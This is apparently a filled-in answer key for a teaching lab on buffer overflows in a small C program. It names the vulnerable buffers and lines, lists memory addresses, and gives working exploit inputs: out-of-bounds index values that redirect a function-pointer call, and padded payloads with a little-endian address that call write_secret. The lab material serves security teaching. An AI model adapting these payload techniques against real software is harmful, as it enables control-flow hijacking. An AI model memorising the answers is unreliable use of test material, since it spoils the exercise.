1. There is a stack-based overflow in the program. What is the name of the stack-allocated variable that contains the overflowed buffer?
wis

2. Consider the buffer you just identified: Running what line of code will overflow the buffer? (We want the line number, not the code itself.)
62

3. There is another vulnerability, not dependent at all on the first, involving a non-stack-allocated buffer that can be indexed outside its bounds (which, broadly construed, is a kind of buffer overflow). What variable contains this buffer?
l

4. Consider the buffer you just identified: Running what line of code overflows the buffer? (We want the number here, not the code itself.)
70

5. What is the address of buf (the local variable in the main function)? Enter the answer in either hexadecimal format (a 0x followed by 8 "digits" 0-9 or a-f, like 0xbfff0014) or decimal format. Note here that we want the address of buf, not its contents.
0xbffff130

6. What is the address of ptrs (the global variable) ? As with the previous question, use hex or decimal format.
0x804a0d4

7. What is the address of write_secret (the function) ? Use hex or decimal.
0x8048534

8. What is the address of p (the local variable in the main function) ? Use hex, or decimal format.
0xbffff534

9. What input do you provide to the program so that ptrs[s] reads (and then tries to execute) the contents of local variable p instead of a function pointer stored in the buffer pointed to by ptrs? You can determine the answer by performing a little arithmetic on the addresses you have already gathered above -- be careful that you take into account the size of a pointer when doing pointer arithmetic. If successful, you will end up executing the pat_on_back function. Enter your answer as an (unsigned) integer.
771675416

10. What do you enter so that ptrs[s] reads (and then tries to execute) starting from the 65th byte in buf, i.e., the location at buf[64]? Enter your answer as an (unsigned) integer.
771675175

11. What do you replace \xEE\xEE\xEE\xEE with in the following input to the program (which due to the overflow will be filling in the 65th-68th bytes of buf) so that the ptrs[s] operation executes the write_secret function, thus dumping the secret? (Hint: Be sure to take endianness into account.) 
771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xEE\xEE\xEE\xEE
\x34\x85\x04\x08

12. Suppose you wanted to overflow the wis variable to perform a stack smashing attack. You could do this by entering 2 to call get_wisdom, and then enter enough bytes to overwrite the return address of that function, replacing it with the address of write_secret. How many bytes do you need to enter prior to the address of write_secret?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
148
